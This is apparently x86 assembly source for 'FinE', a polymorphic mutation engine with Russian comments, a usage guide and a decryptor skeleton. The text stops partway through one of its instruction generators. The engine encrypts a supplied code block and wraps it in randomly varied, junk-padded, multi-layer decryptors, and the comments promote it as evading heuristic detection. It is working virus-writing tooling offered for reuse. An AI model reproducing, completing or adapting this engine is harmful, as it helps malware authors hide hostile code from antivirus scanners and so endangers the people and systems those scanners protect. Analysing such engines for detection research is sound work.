;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;                                                                                                 		 ;
;                         xxxxxxxxxxx                        xxxxxxxxxxx								 ;
;                         xxxxxxxxxxx                        xxxxxxxxxxx                                 ;
;                         xxxx          xxxx   xxxxxxxxxx    xxxx                                        ;
;                         xxxx          xxxx   xxxxxxxxxxx   xxxx                                        ;
;                         xxxxxxxx             xxxx   xxxx   xxxxxxxx                                    ;
;                         xxxxxxxx      xxxx   xxxx   xxxx   xxxxxxxx                                    ;
;                         xxxx          xxxx   xxxx   xxxx   xxxx                                        ;
;                         xxxx          xxxx   xxxx   xxxx   xxxx                                        ;
;                         xxxx          xxxx   xxxx   xxxx   xxxxxxxxxxx                                 ;
;                         xxxx          xxxx   xxxx   xxxx   xxxxxxxxxxx                                 ;
;                                                                                                     	 ;	
;                                                                                                        ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;									Flying mutatIoN Engine												 ;
;											FinE 														 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;																										 ;
;											:)!															 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;										функция FINE													 ;
;								 пиздатый полиморфный движок											 ;
;																										 ;
;																										 ;
;ВХОД:																									 ; 
;1 параметр (и единственный) - адрес структуры (MORPHGEN) (ее описание смотри ниже)						 ;
;--------------------------------------------------------------------------------------------------------;
;ВЫХОД:																									 ;
;EAX - адрес созданного декриптора с зашифрованным кодом 												 ;
;ECX - размер созданного декриптора с зашифрованным кодом												 ;
;+ запись этих же данных в спец. поля структуры (смотри ниже)											 ;	
;--------------------------------------------------------------------------------------------------------;
;ЗАМЕТКИ:																								 ;
;структура, указатель на которую передан в качестве параметра, не портится, т.е. данные в ней после 	 ;
;вызова полиморфного движка остаются теми же (кроме, полей, специально предназняченных для изменения).	 ;
;																										 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;  
;																										 ;
;											!															 ;
;																										 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;																										 ;
;									ОПИСАНИЕ СТРУКТУРЫ													 ;
;										 MORPHGEN														 ;
;							(0 - входной параметр, 1 - выходной) 										 ;
;																										 ;
;																										 ;
;MORPHGEN	struct																						 ;
;	rgen_addr			dd	?	;адрес Генератора Случайных Чисел (ГСЧ)								(0)	 ;
;	tgen_addr			dd	?	;адрес Генератора Мусорных Инструкций								(0)  ;	
;	cryptcode_addr		dd	?	;адрес кода, который надо зашифровать								(0)	 ;
;	size_cryptcode		dd	?	;размер кода, который надо зашифровать								(0)	 ;
;	pa_buf_for_morph	dd	? 	;физ. адрес буфера, куда записать декриптор с шифрованным кодом		(0)	 ;
;	va_buf_for_morph	dd	?	;вирт. адрес буфера, куда записать декриптор с шифрованным кодом	(0)  ;	
;	buf_with_morph		dd	?	;физ. адрес, где расположен созданный декриптор с шифрованным кодом	(1)  ;	
;	size_morph			dd	?	;размер только что созданного декриптора с шифрованным кодом 		(1)	 ;
;	mapped_addr			dd	?	;зарезервировано   (либо база мэпинга (ака адрес файла в памяти)) 	(0)	 ;   
;	reserv1 			dd	?	;зарезервировано													(0)  ;	
;MORPHGEN	ends																						 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;									ОПИСАНИЕ СТРУКТУРЫ 												 	 ;
;									      TGEN 															 ;
;									 (aka TRASHGEN) 													 ; 
;						(более детальное описание смотри в движке xTG)									 ; 
;																										 ;
;																										 ;
;TRASHGEN	struct																						 ;
;	rgen_addr		dd		?	;адрес Генератора Случайных Чисел (ГСЧ)									 ;
;	buf_for_trash	dd		?	;адрес (буфер), куда записывать генерируемое (хех, качественное) дерьмо	 ;
;	size_trash		dd		?	;размер (в байтах), сколько мусора записать  							 ;
;	regs			dd		?	;занятые регистры (2 шт)  												 ;
;	xmask1			dd		?	;64-битная маска для генерации  										 ;
;	xmask2			dd		?	;мусорных команд (ака фильтр)											 ;
;	beg_addr		dd		?	;начальный адрес														 ;
;	end_addr		dd		?	;конечный адрес 														 ;
;	mapped_addr		dd		?	;зарезервировано (либо база мэпинга (ака адрес файла в памяти))			 ;   
;	reserv1			dd		?	;зарезервировано (хз, может когда-то там что и будет) 					 ; 
;TRASHGEN	ends																						 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;											! 															 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;																										 ;
;							ПОЯСНЕНИЕ К ПОЛЯМ СТРУКТУРЫ MORPHGEN: 										 ; 
;																										 ;
;																										 ;
;[   rgen_addr   ] : 																					 ; 
;					 так как данный движок (FINE) разработан без привязки к какому-либо другому мотору,	 ;
;					 а для генерации мусора (и некоторых других фич) важен ГСЧ, поэтому адрес ГСЧ 		 ; 
;					 хранится в (данном) поле структуры. 		 										 ;
;					 ВАЖНО: если мотор FINE будет использовать другой ГСЧ (а не тот, который 	 		 ;
;					 идет с ним в комплекте), надо, чтобы этот другой ГСЧ принимал в качестве 1-го 		 ;
;					 (и единственного!) параметра в стэке число (назовем его N), так как поиск будет в 	 ;
;					 диапазоне [0..n-1]. И на выходе другой ГСЧ	должен возвращать в EAX случайное число. ; 	
;					 Остальные регистры должны остаться неизменными. Все. 			 					 ; 
;--------------------------------------------------------------------------------------------------------; 
;[	 tgen_addr	 ] : 																					 ;
;					 аналогично, как и с предыдущим полем структуры. Только тогда генератор мусора		 ;
;					 должен быть приведен к виду, как xTG (в ненужных полях можно передавать нули и все	 ;
;					 тип-топ).   																		 ;
;--------------------------------------------------------------------------------------------------------;
;[ cryptcode_addr ]  																					 ;
;		 &																								 ;
;[ size_cryptcode ]: 																					 ;
;					 думаю, здесь и так все ясно. 														 ;
;--------------------------------------------------------------------------------------------------------;
;[pa_buf_for_morph] : 																					 ; 
;					 в этом поле передать физический адрес выделенного буфера для создания декриптора.	 ;
;					 Буфер можно выделить например VirtualAlloc etc (как угодно). Если не менять 		 ;
;					 параметры в данном движке, размер этого буфера тогда будет равен: 					 ;
;					 0x3000 + размер кода, который надо пошифровать (размер взят с запасом).  			 ;
;					 Здесь стоит сказать, что:															 ;
;					 	1) выделенный буфер должен быть обнулен, т.е. состоять только из нулевых байт 	 ;
;						   (из-за специфики данного движка (смотри исходники));  						 ;
;						2) как узнать, сколько места выделить для данного движка? Считаем: значит, 		 ;
;						   ( размер кода, который надо пошифровать ) 									 ;
;											+															 ;
;						   ( 30 (max кол-во основных команд, хех, но их столько не наберется) * 		 ;
;							 порция мусора )															 ;
;						   					+															 ;
;						   ( 15 (мах длина основной команды) *30 )										 ;
;											+															 ;
;									на всякий случай													 ;
;					 КОРОЧЕ, скажу так: если глюкануло, значит выдели больше места. 					 ;
;					 ЕЩЕ: если используется мультидекрипторность, то надо выделить еще больше места.	 ;
;					 ЫЩЕ: если вы хотите создать, к примеру, 3 декриптора c порцией мусора 100 байт, 	 ;
;						  то можно смело выделить 0x5000 байт + размер кода, который надо пошифровать. 	 ;
;					 Блядь, кому надо, тот разберется.													 ;
;--------------------------------------------------------------------------------------------------------;
;[va_buf_for_morph] :																					 ; 
;					 в этом поле можно смело вбить 0. Должно использоваться для заменя команды call в 	 ;
;					 декрипторе на взаимозаменяемые команды. 											 ;
;--------------------------------------------------------------------------------------------------------;  
;[ buf_with_morph ]:																					 ;
;					 В это поле кладется адрес, где расположен только что созданный декриптор с 		 ;
;					 шифрованным кодом. Все.  															 ;
;--------------------------------------------------------------------------------------------------------;
;[	size_morph	 ] :																					 ;
;					 В это поле кладется размер (читай выше). И так все понятно. 					 	 ;
;--------------------------------------------------------------------------------------------------------; 
;[  mapped_addr  ] :																					 ;
;					 в это поле кладется база мэпинга (ака адрес файла в памяти). На данный момент в это ; 
;					 поле можно тупо клать 0 или что угодно. Короче, считай, что это поле 				 ;
;					 зарезервировано. Здесь все.   														 ;  
;			 																							 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;                         
;																										 ;
;											y0p!														 ;
;																										 ;  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;											ФИЧИ														 ;
;																										 ;
;																										 ;
;(+) генерация рэндомных регистров 																		 ; 
;--------------------------------------------------------------------------------------------------------; 
;(+) генерация рандомных ключей для шифрования															 ;  																	 
;--------------------------------------------------------------------------------------------------------;
;(+) размер декриптора всегда разный 														 			 ; 
;--------------------------------------------------------------------------------------------------------;
;(+) команды декриптора имеют взаимозаменяемые конструкции												 ; 
;--------------------------------------------------------------------------------------------------------;
;(+) команды декриптора могут не идти друг за другом (связка jmp'ами)									 ;
;--------------------------------------------------------------------------------------------------------;
;(+) использование ГСЧ и Генератора Мусора (особенно своих, так это вообще охуительно)					 ; 
;--------------------------------------------------------------------------------------------------------;
;(+) несколько алгоритмов шифрования кода (ADD/SUB/XOR)													 ;
;--------------------------------------------------------------------------------------------------------;
;(+) мультидекрипторность (можно легко дописать рэндомный выбор количества декрипторов)					 ; 
;--------------------------------------------------------------------------------------------------------;
;(+) базонезависимость																					 ;
;--------------------------------------------------------------------------------------------------------;
;(+) нет привязки к другим движкам (ГСЧ & trashgen можно юзать любой - условия читай выше;)				 ; 
;		* можно компилить как самостоятельный модуль;													 ;            
;--------------------------------------------------------------------------------------------------------; 
;(+) не юзает WinAPI																					 ;
;--------------------------------------------------------------------------------------------------------;
;(+) не использует данные и дельта-смещение, супер для мутации двига. 									 ; 
;																										 ; 				
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;											y0p!														 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;										ИСПОЛЬЗОВАНИЕ: 													 ;
;																										 ;
;																										 ;
;1) Подключение:																						 ;
;		FinE.asm																						 ; 
;2) Вызов (пример stdcall):																				 ;
;		...																								 ;
;		szBuf		db 100 		dup (00h) 																 ; 
;		szBuf2		db 5000h	dup (00h) ;! обязательно обнулить! 										 ;
;		...										      													 ;
;		lea		ecx,szBuf																				 ;
;		lea		edx,szBuf2 																				 ;
;		assume	ecx:ptr MORPHGEN																		 ;
;		mov		[ecx].rgen_addr,00401000h		;по этому адресу должен находиться ГСЧ					 ;
;		mov		[ecx].tgen_addr,00401300h		;по этому адресу должен находиться трэшген 				 ; 
;		mov		[ecx].cryptcode_addr,00402000h	;по этому адресу находится код, который мы отмутируем 	 ; 
;		mov		[ecx].size_cryptcode,100		;размер этого кода 										 ; 
;		mov		[ecx].pa_buf_for_morph,edx		;буфер для создания декриптора с шифрованным кодом		 ; 
;		mov		[ecx].va_buf_for_morph,0		;это поле пока что не юзается, поэтому ставим смело 0.	 ;
;												;[ecx].buf_with_morph	- выходной параметр				 ;
;												;[ecx].size_morph		- выходной параметр 			 ;   
;												;остальные параметры обнулены.							 ;
;		call	FINE							;вызываем полиморфный движок  					 		 ; 	
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;																										 ;
;										СКЕЛЕТ ДЕКРИПТОРА:												 ;
;																										 ;
;																										 ;
;		call			imm32			;здесь вычисляется текущее местонахождение декриптора			 ;
;		pop				reg1			;и сохраняется в регистре reg1 									 ;
;		push			imm32			;в стэк кладется размер кода, который надо расшифровать 		 ;
;		add				reg1,imm32		;регистр reg1 указывает на конец кода, который надо расшифровать ;
;		mov				reg2,imm32		;в reg2 содержится ключ для расшифровки кода					 ;
;	--> xor/add/sub		[reg1],reg2		;расшифровка кода												 ;
;	|	xor/add/sub		reg2,imm32		;ключ изменяется нехитрым алгоритмом							 ;
;	|	dec				reg1			;уменьшаем на 1 reg1											 ;
;	|	dec				[esp]			;уменьшаем на 1 размер											 ;
;	----jne				imm32			;переход на расшифровку кода									 ;
;		pop				reg				;восстанавливаем стэк   										 ;
;																										 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;v1.0.1    
;коменты обычно пишутся ночью, поэтому возможен бредняк в них. 




													;m1x
												;pr0mix@mail.ru
											;EOF 





;======================================================================================================== 

;========================================================================================================
;структура MORPHGEN, необходимая для данного генератора 
;========================================================================================================
MORPHGEN	struct
	rgen_addr			dd		?
	tgen_addr			dd		?
	cryptcode_addr		dd		?
	size_cryptcode		dd		?
	pa_buf_for_morph	dd		?
	va_buf_for_morph	dd		?
	buf_with_morph		dd		?
	size_morph			dd		?
	mapped_addr			dd		? 
	reserv1 			dd		? 
MORPHGEN	ends

;========================================================================================================
;структура TGEN, необходимая для данного генератора (aka TRASHGEN, описание смотри в xTG)  
;========================================================================================================
TGEN	struct
	rgen_addr		dd		?
	buf_for_trash	dd		?
	size_trash		dd		?
	regs			dd		?
	xmask1			dd		?
	xmask2			dd		?
	beg_addr		dd		?
	end_addr		dd		?
	mapped_addr		dd		? 
	reserv1			dd		?	
TGEN	ends
;========================================================================================================

num_decrypts			equ		3				;количество создаваемых декрипторов 
mtrash1					equ		0FFFFFFFFh		;маска для трэшгена (если он ее юзает) - можно выставить для генерации антиэвристического дерьма или пиздатого хаоса  
mtrash2					equ		000h			;вторая половина маски 

num_general_instr		equ		11				;количество основных команд (команд декриптора, их чуть больше может быть) 
size_general_instr		equ		15				;максимальный размер одной основной команды  (можно уменьшить, к примеру до 10 etc) 
num_steps				equ		30				;счетчик (о нем читай ниже) 
portion					equ		100				;одна порция мусора 
max_portion				equ		portion*num_general_instr+size_general_instr*num_general_instr	;максимальный размер одной порции мусора)  - чем меньше это значение, тем меньше вероятность, что команды переставятся в случайном порядке (смотри исходник)   
min_portion				equ		50 				;минимальный размер порции мусора 

addr1					equ		000h			;начальный и конечный адреса для трэшгена (если он их юзает) 
addr2					equ		000h

;======================================================================================================== 








FINE:
	pushad										;save all regs  
	cld
	mov		edx,dword ptr [esp+24h]				;в edx - указатель на cтруктуру MORPHGEN  
	assume	edx:ptr MORPHGEN
	mov		ecx,[edx].size_cryptcode			;ecx - размер кода, который надо зашифровать 
	mov		esi,[edx].cryptcode_addr			;esi - адрес этого кода 
	mov		edi,[edx].pa_buf_for_morph			;edi - адрес (он же буфер), куда запишем декриптор с зашифрованным кодом
	xor		eax,eax								;далее кладем в стэк (и заполняем некоторые поля) структуру TGEN (aka TRASHGEN) 
	push	eax									;reserv1
	push	[edx].mapped_addr					;mapped_addr  
	push	addr2								;end_addr
	push	addr1								;beg_addr (про них читай в движке xTG)
	push	mtrash2								;64-битная маска для генерации мусора 
	push	mtrash1
	push	eax;regs							;регистры (пока кладем нули, а правильно заполним после, изучай исходники) 
	push	eax;portion							;порция мусора, которую надо сгенерировать
	push	eax;buf_for_trash					;буфер, куда записывать порцию мусора 
	push	[edx].rgen_addr						;ГСЧ 
	mov		ebp,esp								;указателем на данную структуру будет регистр ebp
	assume	ebp:ptr TGEN						;[ebp+-00]
	mov		eax,num_decrypts					;количество декрипторов
_next_decrypt_:
	push	eax									;[ebp-04]
	call	morph								;[ebp-08]     ;вызываем функцию создания сего декриптора с шифрованным кодом  
	mov		esi,edi								;esi делаем равным началу только что созданного декриптора 
	add		edi,ecx								;edi переводим на конец только что созданного декриптора + шифрованный текст  
	pop		eax
	dec		eax									;уменьшаем счетчик
	jnz		_next_decrypt_						;есть варик еще замутить декриптор? 
	add		esp,10*4							;когда все что надо записали, выравниваем стэк 
	sub		edi,ecx								;корректируем edi на начало последнего созданного декриптора 
	mov		[edx].buf_with_morph,edi			;сохраним это значение в структуре
	mov		[edx].size_morph,ecx				;а также сохраним размер данного декриптора + шифрованного текста 
	mov		dword ptr [esp+1Ch],edi				;EAX=EDI
	mov		dword ptr [esp+18h],ecx				;ECX=ECX   
	popad										;восстанавливаем регистры
	ret		4									;выходим 
;========================================================================================================
morph:
	call	gen_reg								;вызываем функцию генерации занятых регистров (используемых) (2 шт)    
	push	edi									;[ebp-12]     сохраняем edi в стэке 
	push	portion								;сгенерируем в самом начале 1-ую порцию мусора 
	call	[edx].rgen_addr
	add		eax,41								;от коллизий  										
	call	gen_trash  
;--------------------------------------------------------------------------------------------------------
	push	edi									;[ebp-16]     ;здесь адрес будет изменяться (нужно для поиска свободного рэндомного адреса) 
	push	edi									;[ebp-20]     ;адрес сразу после call $+5 (сохранится после в reg1)     
	call	instr___call						;CALL $+value 

    call	instr___pop__reg					;POP reg1 

    call	instr___push__imm					;PUSH <size> 

    push	edi									;[ebp-24]     ;сохраним это место (в нижевызванной функции его правильно скорректируем), чтобы после написать правильный размер после по этому адресу   
    call	instr___add__reg_imm				;ADD reg1,<trash+size=адрес конца криптованного кода> 

    push	edi									;[ebp-28]     ;сохраним и это место, здесь после впишем ключ1, по которому и будем расшифровывать данные (код) 
    call	instr___mov__reg_imm				;MOV reg2,key1 

    push	edi									;[ebp-32]     ;сохраним также и этот адрес, ибо условный переход будет указывать именно сюда  
    push	edi									;[ebp-36]     ;здесь хранится число - какой алг криптовки юзаем   
    call	instr___addxorsub__addrreg_reg		;ADD/XOR/SUB dword ptr [reg1],reg2  

    push	edi									;[ebp-40]     ;сюда позже впишем ключ2, на этот ключ будет изменяться ключ1  
    push	edi									;[ebp-44]     ;здесь хранится 2-ое число - какой 2-ой ключ для изменения 1-ого ключа юзаем          
    call	instr___addxorsub__reg_imm			;ADD/XOR/SUB reg2,key2  

    call	instr___dec__reg					;DEC reg1 

    call	instr___dec__addresp				;DEC dword ptr [esp], JNE <value32>  

    call	instr___pop__reg					;POP reg  
;--------------------------------------------------------------------------------------------------------    
	push	portion
	call	[edx].rgen_addr						;случайным образом определим, сколько мусора (в байтах) записать 
	push	eax
	add		eax,ecx								;добавим размер данных, которые надо будет расшифровать декриптором 
	call	goto_free_addr						;и вызовем функцию получения случайного свободного адреса в заданном (заранее) промежутке, и по этому адресу и будем сейчас записывать 

	add		eax,(max_portion+portion+portion+min_portion)	;также скорректируем (чтобы все правильно отработало) данный размер    
	add		dword ptr [ebp-16],eax				;и добавим к изменяющемуся адресу (он указывает теперь на свободное место, куда будем записывать очередной декриптор etc)  
	pop		eax
	call	gen_trash							;генерируем порцию мусора  
;--------------------------------------------------------------------------------------------------------
	push	-1
	call	[edx].rgen_addr
	xchg	eax,ebx								;в ebx теперь хранится ключ1 
	push	-1
	call	[edx].rgen_addr
	push	eax									;[ebp-48]     ;а в стэке теперь хранится ключ2 
;--------------------------------------------------------------------------------------------------------
	mov		eax,dword ptr [esi]					;и начинаем шифровать код 
	add		esi,4  
_crypt_:
	;mov		eax,dword ptr [esi]
	cmp		dword ptr [ebp-36],1				;optimization!     ;смотрим, какой алгоритм шифровки мы выбирали, и выбираем симметричный алг расшифровки 
	jl		_xor03_												            
	jg		_add03_
_sub03_:
	sub		eax,ebx
	jmp		_chg_key1_

_add03_:
	add		eax,ebx
	jmp		_chg_key1_ 

_xor03_: 
	xor		eax,ebx

_chg_key1_:
	cmp		ecx,1								;optimization!     ;смотрим, это последняя итерация? если да, то изменять ключ1 на ключ2 уже не надо  
	je		_write_crypt_data_ 
	cmp		dword ptr [ebp-44],1				;optimization!     ;смотрим какой алг мы использовали для изменения ключ1 (на ключ2) 
	jl		_xor04_
	jg		_add04_
_sub04_:
	sub		ebx,dword ptr [esp]
	jmp		_write_crypt_data_

_add04_:
	add		ebx,dword ptr [esp]
	jmp		_write_crypt_data_

_xor04_:
	xor		ebx,dword ptr [esp]
	 
_write_crypt_data_:
	mov		dword ptr [edi],eax
	inc		edi
	lodsb
	ror		eax,8								;берем следующий байт, и начинаем шифровать дальше  
	;inc		esi
	loop	_crypt_
;--------------------------------------------------------------------------------------------------------		  	
	pop		ecx									;key2

	pop		eax
	pop		eax
	mov		dword ptr [eax],ecx					;вытаскиваем из стэка ранее сохраненный ключ2 и адрес, по которому и запишем в декриптор данный ключик  

	pop		eax
	pop		eax    
	pop		eax
	mov		dword ptr [eax],ebx					;вытаскиваем из стэка адрес, по которому и запишем в декриптор ключ1  

	dec		edi									;корректируем edi 
	xchg	eax,edi								;далее вытаскиваем адрес, по которому надо записать размер шифрованных байт + мусор (то есть reg1 должен указывать на конец шифрованного кода) 
	pop		edi
	pop		esi
	sub		eax,esi
	test	byte ptr [edi-1],20h;0E8h			;после смотрим, какая команда была записана: ADD или SUB ? и в заисимости от этого изменяем знак регистра 
	je		_addregimm_
_subregimm_:
	neg		eax
_addregimm_: 
	stosd  

	pop		ecx									;получаем адрес, по которому можно будет записывать новый декриптор (он больше чем тот, что в edi) 
	pop		edi									;получаем адрес начала только что записанного декриптора 
	sub		ecx,edi								;вычисляем и сохраняем в ecx размер только что записанного декриптора + шифрованного кода  
                
	ret											;выходим
;========================================================================================================	 





;=====================================[CALL $+value]=====================================================
instr___call: 
	push	portion
	call	[edx].rgen_addr						;получаем рэндомно размер 1-ой порции мусора, которую будем генерить и записывать 
	push	eax									;сохраняем 
	push	portion
	call	[edx].rgen_addr						;получаем рэндомно размер 2-ой порции мусора
	push	eax									;сохраняем и его 
	push	portion
	call	[edx].rgen_addr						;получаем рэндомно размер 3-ей порции мусора 
	push	eax									;и его также сохраняем в стэке 
	add		eax,dword ptr [esp+4]
	add		eax,dword ptr [esp+8]				;получаем общий размер  
	call	goto_free_addr						;получаем рэндомный свободный адрес в заранее заданном промежутке, по которому вместится столько мусора + нужная команда (в данном варике это call $+5) 
	pop		eax									;вытаскиваем из стэка ранее сохраненный размер мусора 
	call	gen_trash							;герерим мусор
	mov		al,0E8h								;далее генерим команду CALL $+value 
	stosb
	pop		eax
	stosd
	mov		dword ptr [ebp-20],edi 
	call	gen_trash							;записываем очередную порцию мусора  
	pop		eax
	call	gen_trash							;etc  
  	
	ret											;на выход  
;=====================================[CALL $+value]===================================================== 





;=======================================[POP reg1]=======================================================  
instr___pop__reg:
	push	portion								;etc (смотри выше) 
	call	[edx].rgen_addr
	push	eax
	push	portion
	call	[edx].rgen_addr
	push	eax
	add		eax,dword ptr [esp+4]  
	call	goto_free_addr
	pop		eax
	call	gen_trash 
;--------------------------------------------------------------------------------------------------------
	push	2									;далее смотрим, какую команду генерить?
	call	[edx].rgen_addr
	test	eax,eax
	je		_pop__reg1_							;POP reg1 или
;--------------------------------------------------------------------------------------------------------
_mov__reg1_addresp___add__esp_4_:				;MOV reg1,[esp]   add esp,4    ? 
	mov		al,8Bh
	stosb
	mov		al,bh
	shl		eax,3
	add		al,4
	stosb
	mov		al,24h
	stosb
	pop		eax
	call	gen_trash 
	push	portion
	call	[edx].rgen_addr
	push	eax
	push	portion
	call	[edx].rgen_addr
	push	eax
	add		eax,dword ptr [esp+4]
	call	goto_free_addr
	pop		eax
	call	gen_trash
	mov		ax,0C483h
	stosw
	mov		al,04
	jmp		_iprendtrash_ 
;--------------------------------------------------------------------------------------------------------
_pop__reg1_:
	mov		al,58h
	add		al,bh

_iprendtrash_: 
	stosb
	pop		eax
	call	gen_trash 
	ret
;=======================================[POP reg1]======================================================= 





;=======================================[PUSH imm]======================================================= 
instr___push__imm:
	push	portion
	call	[edx].rgen_addr
	push	eax
	push	portion
	call	[edx].rgen_addr
	push	eax
	add		eax,dword ptr [esp+4]
	call	goto_free_addr
	pop		eax
	call	gen_trash
;--------------------------------------------------------------------------------------------------------
	push	2									;PUSH imm или 
	call	[edx].rgen_addr						;MOV reg2,imm   PUSH reg2      ? 
	test	eax,eax
	je		_push__imm_
;--------------------------------------------------------------------------------------------------------
_mov__reg2_imm___push__reg2_:
	mov		al,0B8h
	add		al,bl
	stosb 
	mov		eax,ecx
	stosd
	pop		eax
	call	gen_trash
	push	portion
	call	[edx].rgen_addr
	push	eax
	push	portion
	call	[edx].rgen_addr
	push	eax
	add		eax,dword ptr [esp+4]
	call	goto_free_addr
	pop		eax
	call	gen_trash  

	mov		al,50h
	add		al,bl
	stosb
	jmp		_ipiendtrash_ 
;--------------------------------------------------------------------------------------------------------
_push__imm_:
	mov		al,68h
	stosb
	mov		eax,ecx
	stosd

_ipiendtrash_: 
	pop		eax
	call	gen_trash  
	ret 
;=======================================[PUSH imm]======================================================= 





;=====================================[ADD reg1,imm]===================================================== 
instr___add__reg_imm:
	push	portion
	call	[edx].rgen_addr
	push	eax
	push	portion
	call	[edx].rgen_addr
	push	eax
	add		eax,dword ptr [esp+4] 
	call	goto_free_addr
	pop		eax
	call	gen_trash 
	mov		al,81h
	stosb 
;--------------------------------------------------------------------------------------------------------
	push	2									;ADD reg1,imm или 
	call	[edx].rgen_addr						;SUB reg1,-imm     ?  
	imul	eax,28h
	add		al,0C0h
	add		al,bh
	stosb
;--------------------------------------------------------------------------------------------------------
	mov		dword ptr [ebp-24],edi 
	xor		eax,eax
	stosd 
	pop		eax 
	call	gen_trash 
	ret
;=====================================[ADD reg1,imm]=====================================================  





;=====================================[MOV reg2,imm]===================================================== 
instr___mov__reg_imm:
	push	portion
	call	[edx].rgen_addr
	push	eax
	push	portion
	call	[edx].rgen_addr
	push	eax
	add		eax,dword ptr [esp+4]
	call	goto_free_addr
	pop		eax
	call	gen_trash
;--------------------------------------------------------------------------------------------------------
	push	2									;MOV reg2,imm или 
	call	[edx].rgen_addr						;PUSH imm   POP reg2     ?  
	test	eax,eax
	je		_mov__reg_imm_
;--------------------------------------------------------------------------------------------------------
_push__imm___pop__reg_:
	mov		al,68h
	stosb
	mov		dword ptr [ebp-28],edi
	xor		eax,eax
	stosd
	pop		eax
	call	gen_trash 
	push	portion                  
	call	[edx].rgen_addr
	push	eax
	push	portion
	call	[edx].rgen_addr
	push	eax
	add		eax,dword ptr [esp+4]
	call	goto_free_addr
	pop		eax
	call	gen_trash
	mov		al,58h
	add		al,bl
	stosb
	jmp		_mriendtrash_ 
;-------------------------------------------------------------------------------------------------------- 
_mov__reg_imm_:	
	mov		al,0B8h
	add		al,bl
	stosb
	mov		dword ptr [ebp-28],edi
	xor		eax,eax
	stosd
_mriendtrash_: 
	pop		eax
	call	gen_trash 	
	ret
;=====================================[MOV reg2,imm]=====================================================  





;===============================[ADD/SUB/XOR [reg1],reg2]================================================ 
instr___addxorsub__addrreg_reg:
	push	portion
	call	[edx].rgen_addr
	push	eax
	push	portion
	call	[edx].rgen_addr
	push	eax
	add		eax,dword ptr [esp+4]
	call	goto_free_addr
	pop		eax
	mov		dword ptr [ebp-32],edi 
	call	gen_trash
;--------------------------------------------------------------------------------------------------------
	push	3									;ADD, SUB, или XOR      ? 
	call	[edx].rgen_addr
	mov		dword ptr [ebp-36],eax
;-------------------------------------------------------------------------------------------------------- 
	cmp		al,1
	jl		_xor01_
	jg		_sub01_
_add01_: 
	jmp		_n001_
_sub01_:
	mov		al,29h 
	jmp		_n001_
_xor01_:
	mov		al,31h  
_n001_:
	stosb	  
	mov		al,bl
	shl		eax,3
	add		al,bh
	stosb 
 	pop		eax
 	call	gen_trash 
	ret
;===============================[ADD/SUB/XOR [reg1],reg2]================================================  





;================================[ADD/SUB/XOR reg2,imm]================================================== 
instr___addxorsub__reg_imm:
	push	portion
	call	[edx].rgen_addr
	push	eax
	push	portion
	call	[edx].rgen_addr 
	push	eax
	add		eax,dword ptr [esp+4]
	call	goto_free_addr
	pop		eax
	call	gen_trash
;--------------------------------------------------------------------------------------------------------
   	mov		al,81h
   	stosb 
;--------------------------------------------------------------------------------------------------------
   	push	3									;ADD, SUB, или XOR      ? 
   	call	[edx].rgen_addr
    mov		dword ptr [ebp-44],eax
	cmp		al,1
	mov		al,bl 									;reg2 
	jl		_xor02_
	jg		_sub02_
_add02_:
	add		al,0C0h
	jmp		_n002_ 									

_sub02_:
	add		al,0E8h
	jmp		_n002_ 

_xor02_:
	add		al,0F0h

_n002_:
	stosb
